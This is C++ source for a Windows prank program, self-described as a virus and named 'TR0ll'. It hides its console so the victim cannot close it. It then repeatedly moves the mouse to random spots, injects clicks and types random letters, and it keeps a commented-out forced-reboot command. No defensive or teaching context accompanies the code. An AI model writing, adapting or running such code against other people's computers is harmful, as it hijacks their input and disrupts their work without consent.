#define _WIN32_WINNT 0x0500 //For hiding your console

#include <cstdlib>
#include <iostream>
#include <Windows.h>
#include <WinBase.h>

using namespace std;

void Craze(), HideWin();
HWND hWnd;
LRESULT CALLBACK DlgProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

void HideWin()
{
	// Hide the console so that they can't close it
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
}

void Craze()
{
	// Make the mouse cursor crazy
	int X = rand() % 1367;
	int Y = rand() % 769;
	SetCursorPos(X, Y);
}

int main()
{
	system("TITLE TR0ll");
	cout << "TR0ll —v2.1--\n";

	HideWin();
	Sleep(1000);

	LPCWSTR window_title = L"Untitled - Paint";
	HWND hWND1 = FindWindow(NULL, window_title);
	int n = 0;
	do
	{
		// The Virus Begins
		Craze();
		Sleep(10);
		n++;
		if (GetAsyncKeyState(VK_NUMPAD0)) { // Exit
			return 0;
		}
		if (1) {//Mouseposition
			POINT p;
			GetCursorPos(&p);
			ScreenToClient(hWND1, &p);
			cout << "x-position: " << p.x << " | y-position: " << p.y << endl;
		}
		if (1) { // leftclick
			INPUT iNPUT = { 0 };
			iNPUT.type = INPUT_MOUSE;
			iNPUT.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
			SendInput(1, &iNPUT, sizeof(iNPUT));
			ZeroMemory(&iNPUT, sizeof(iNPUT));
			iNPUT.type = INPUT_MOUSE;
			iNPUT.mi.dwFlags = MOUSEEVENTF_LEFTUP;
			SendInput(1, &iNPUT, sizeof(iNPUT));
		}
		if (1) { //write a
			INPUT Input = { 0 };
			Input.type = INPUT_KEYBOARD;
			char mass[5] = { 'a','b','c','d','e' };
			int index = 0 + rand() % 5;
			Input.ki.wVk = VkKeyScanA(mass[index]);
			SendInput(1, &Input, sizeof(Input));
			ZeroMemory(&Input, sizeof(Input));
			Input.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &Input, sizeof(Input));

		}
		if (GetAsyncKeyState(VK_NUMPAD4)) { // Set mouse position using SendInput
			int x = 100;
			int y = 100;

			// Get total screen coordinates
			int screen_x = GetSystemMetrics(SM_CXSCREEN);
			int screen_y = GetSystemMetrics(SM_CYSCREEN);

			WINDOWPLACEMENT wp;
			GetWindowPlacement(hWND1, &wp);

			long xConverted = (65535 * (x + wp.rcNormalPosition.left)) / screen_x;
			long yConverted = (65535 * (y + wp.rcNormalPosition.top)) / screen_y;

			INPUT iNPUT = { 0 };
			iNPUT.type = INPUT_MOUSE;
			iNPUT.mi.dwFlags = (MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE);
			iNPUT.mi.dx = xConverted;
			iNPUT.mi.dy = yConverted;
			SendInput(1, &iNPUT, sizeof(iNPUT));

		}
	} while (n < 100);
	// system("shutdown -r -t 10");
	return EXIT_SUCCESS;
}